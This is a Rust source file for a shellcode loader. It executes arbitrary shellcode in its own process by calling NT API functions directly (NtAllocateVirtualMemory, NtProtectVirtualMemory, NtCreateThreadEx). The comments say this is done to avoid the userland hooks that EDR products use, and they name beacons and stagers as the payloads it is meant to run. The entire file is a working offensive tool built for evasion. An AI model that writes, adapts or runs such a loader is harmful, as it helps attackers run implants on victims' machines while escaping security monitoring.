//! loader.rs — self-injection shellcode execution via NT API
//!
//! Execution pipeline:
//!   1. NtAllocateVirtualMemory  — allocate RW memory in the current process
//!   2. copy shellcode into the allocation
//!   3. NtProtectVirtualMemory   — flip to RX (no RWX page ever exists at exec time)
//!   4. NtCreateThreadEx         — start a new thread at the shellcode entry point
//!   5. NtWaitForSingleObject    — wait for the thread to complete (or run forever
//!                                 if the payload is a beacon / stager)
//!
//! All NT functions are called directly through their ntdll exports rather
//! than the kernel32 wrappers, reducing the userland hook surface.
//!
//! None of the Windows-sys "memory alloc" or "thread create" Win32 API
//! features are used here on purpose — the NT layer is one level below
//! what most EDR hooks instrument first.

use core::ptr;
use windows_sys::Win32::Foundation::{HANDLE, INVALID_HANDLE_VALUE};

// ---------------------------------------------------------------------------
// NT API declarations (not all are exposed by windows-sys at this version)
// ---------------------------------------------------------------------------

// NT status codes
const STATUS_SUCCESS: i32 = 0x0000_0000;

// Memory protection constants (same numeric values as Win32 PAGE_* flags)
const PAGE_READWRITE:          u32 = 0x04;
const PAGE_EXECUTE_READ:       u32 = 0x20;
const MEM_COMMIT_AND_RESERVE:  u32 = 0x3000; // MEM_COMMIT | MEM_RESERVE

#[link(name = "ntdll")]
extern "system" {
    /// Allocate virtual memory in a process.
    fn NtAllocateVirtualMemory(
        process_handle:     HANDLE,
        base_address:       *mut *mut u8,
        zero_bits:          usize,
        region_size:        *mut usize,
        allocation_type:    u32,
        protect:            u32,
    ) -> i32;

    /// Change memory protection on a region.
    fn NtProtectVirtualMemory(
        process_handle:     HANDLE,
        base_address:       *mut *mut u8,
        region_size:        *mut usize,
        new_protect:        u32,
        old_protect:        *mut u32,
    ) -> i32;

    /// Create a thread in a process.
    fn NtCreateThreadEx(
        thread_handle:      *mut HANDLE,
        desired_access:     u32,
        object_attributes:  *mut u8,  // OBJECT_ATTRIBUTES* — null for defaults
        process_handle:     HANDLE,
        start_routine:      *const u8,
        argument:           *mut u8,
        create_flags:       u32,
        zero_bits:          usize,
        stack_size:         usize,
        maximum_stack_size: usize,
        attribute_list:     *mut u8,  // PS_ATTRIBUTE_LIST* — null for defaults
    ) -> i32;

    /// Wait for a kernel object (thread handle) to become signalled.
    fn NtWaitForSingleObject(handle: HANDLE, alertable: u8, timeout: *const i64) -> i32;
}

/// Current process pseudo-handle (-1 / 0xFFFFFFFF…)
#[inline(always)]
fn current_process() -> HANDLE {
    INVALID_HANDLE_VALUE
}

/// Execute `shellcode` in the current process via NT APIs.
///
/// The function blocks until the spawned thread returns.  For long-running
/// payloads (beacons) this means the loader process stays alive while the
/// payload runs.
///
/// # Errors
/// Returns `Err(&'static str)` with the failing step name and NTSTATUS on
/// allocation / protection / thread-creation failure.
pub fn execute(shellcode: &[u8]) -> Result<(), &'static str> {
    if shellcode.is_empty() {
        return Err("shellcode slice is empty");
    }

    unsafe {
        // ------------------------------------------------------------------
        // Step 1: Allocate RW memory
        // ------------------------------------------------------------------
        let mut base: *mut u8 = ptr::null_mut();
        let mut size: usize   = shellcode.len();

        let status = NtAllocateVirtualMemory(
            current_process(),
            &mut base,
            0,
            &mut size,
            MEM_COMMIT_AND_RESERVE,
            PAGE_READWRITE,
        );
        if status != STATUS_SUCCESS {
            return Err("NtAllocateVirtualMemory failed");
        }

        // ------------------------------------------------------------------
        // Step 2: Copy shellcode into the allocation
        // ------------------------------------------------------------------
        ptr::copy_nonoverlapping(shellcode.as_ptr(), base, shellcode.len());

        // ------------------------------------------------------------------
        // Step 3: Flip protection to RX (no RWX at execution time)
        // ------------------------------------------------------------------
        let mut base_alias: *mut u8 = base;
        let mut size_alias: usize   = shellcode.len();
        let mut old_protect: u32    = 0;

        let status = NtProtectVirtualMemory(
            current_process(),
            &mut base_alias,
            &mut size_alias,
            PAGE_EXECUTE_READ,
            &mut old_protect,
        );
        if status != STATUS_SUCCESS {
            return Err("NtProtectVirtualMemory (RX) failed");
        }

        // ------------------------------------------------------------------
        // Step 4: Create thread at shellcode entry point
        // ------------------------------------------------------------------
        let mut h_thread: HANDLE = 0;

        // THREAD_ALL_ACCESS = 0x001F_03FF
        let status = NtCreateThreadEx(
            &mut h_thread,
            0x001F_03FF,
            ptr::null_mut(),
            current_process(),
            base,               // start_routine = shellcode base
            ptr::null_mut(),    // no argument
            0,                  // no CREATE_SUSPENDED
            0,
            0,
            0,
            ptr::null_mut(),
        );
        if status != STATUS_SUCCESS {
            return Err("NtCreateThreadEx failed");
        }

        // ------------------------------------------------------------------
        // Step 5: Wait indefinitely for the payload thread to exit
        // ------------------------------------------------------------------
        NtWaitForSingleObject(h_thread, 0 /* non-alertable */, ptr::null());

        Ok(())
    }
}
